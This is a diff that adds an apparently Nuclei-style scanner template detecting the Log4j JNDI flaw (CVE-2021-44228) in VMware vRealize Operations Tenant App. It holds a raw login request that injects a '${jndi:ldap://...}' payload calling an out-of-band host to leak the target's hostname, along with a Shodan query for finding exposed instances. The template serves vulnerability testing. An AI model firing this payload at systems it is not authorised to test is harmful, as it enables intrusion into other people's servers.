@@ -1,0 +1,41 @@
+id: vrealize-operations-tenant-app-log4j-rce
+
+info:
+  name: vRealize Operations Tenant App Log4j JNDI RCE
+  author: bughuntersurya
+  severity: critical
+  description: A critical vulnerability in Apache Log4j identified by CVE-2021-44228 has been publicly disclosed that may allow for remote code execution in an impacted vRealize Operations Tenant Application.
+  metadata:
+    shodan-query: http.title:"vRealize Operations Tenant App"
+  tags: rce,log4j,vmware,vrealize
+
+requests:
+  - raw:
+      - |
+        POST /suite-api/api/auth/token/acquire HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Origin: {{RootURL}}
+        Referer: {{RootURL}}/ui/
+        
+
+        {"username":"${jndi:ldap://${hostName}.{{interactsh-url}}}","password":"admin"}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"  # Confirms the DNS Interaction
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Match for extracted ${hostName} variable
+
+    extractors:
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output
